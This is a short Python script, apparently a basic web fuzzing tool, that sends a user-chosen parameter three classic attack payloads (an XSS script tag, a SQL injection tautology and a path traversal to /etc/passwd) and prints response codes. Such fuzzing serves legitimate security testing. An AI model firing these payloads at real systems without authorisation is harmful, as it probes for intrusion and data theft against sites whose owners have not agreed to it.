import requests

def fuzz_parameter(url, param_name, payloads):
    for payload in payloads:
        params = {param_name: payload}
        try:
            response = requests.get(url, params=params)
            print(f"🔍 Testing payload {payload} -> Status: {response.status_code}")
        except requests.RequestException:
            print(f"❌ Failed with payload {payload}")

if __name__ == "__main__":
    target_url = input("🌐 Enter target URL: ")
    param = input("🛠 Enter parameter to fuzz: ")
    payloads = ['<script>alert(1)</script>', "' OR '1'='1", "../etc/passwd"]
    fuzz_parameter(target_url, param, payloads)
